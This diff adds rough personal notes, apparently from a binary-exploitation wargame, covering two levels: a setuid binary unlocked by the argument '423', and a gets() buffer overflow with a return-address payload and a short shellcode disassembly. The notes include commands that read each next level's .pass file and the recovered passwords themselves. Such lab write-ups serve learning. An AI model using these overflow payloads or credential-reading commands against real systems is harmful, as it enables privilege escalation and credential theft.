@@ -1,0 +1,50 @@
+level0:
+	
+	cmd: "ls -la at 'home/user/level0'"
+	see 'level0' owned by level1
+	
+	Decompile executable '/home/user/level0/level0'
+	see condition that blocks if input is different than "423"
+	then it executes an execv command with the rights of the executable owner so 'level01'
+	
+	cmd: "./level0 423"
+	cmd: >"cat /home/user/level1/.pass"
+	
+	pass:  "1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a"
+
+level1:
+	
+	gdb mettre breakpoint dans gets
+	
+	cmd = (python -c "print('T'*76 + '\x44\x84\x04\x08')" ; echo 'cat /home/user/level2/.pass') | ./level1
+	
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+	
+	0xbffff6f0	addresse du debut de la memoire des variables locales
+	0xbffff6dc addresse de stockage de l'address de retour du get
+	
+	3221223152 - 3221223132 = 20
+	
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+\xb8 \x44\x84\x04\x08
+
+0x08048444
+\x44\x84\x04\x08
+0xbf ff f6 e0
+\x0e\xf6\xff\xbf
+
+00000000 <.text>:
+   0:	b8 44 84 04 08			mov    $0x8048444,%eax
+   5:	ff e0							jmp    *%eax
+
+
+
+\xb8\x44\x84\x04\x08\xff\xe0
+
+p/x *(unsigned long*)$ebp
+
+p/x *(unsigned long long*)$esp
+
+
+0x080491a0
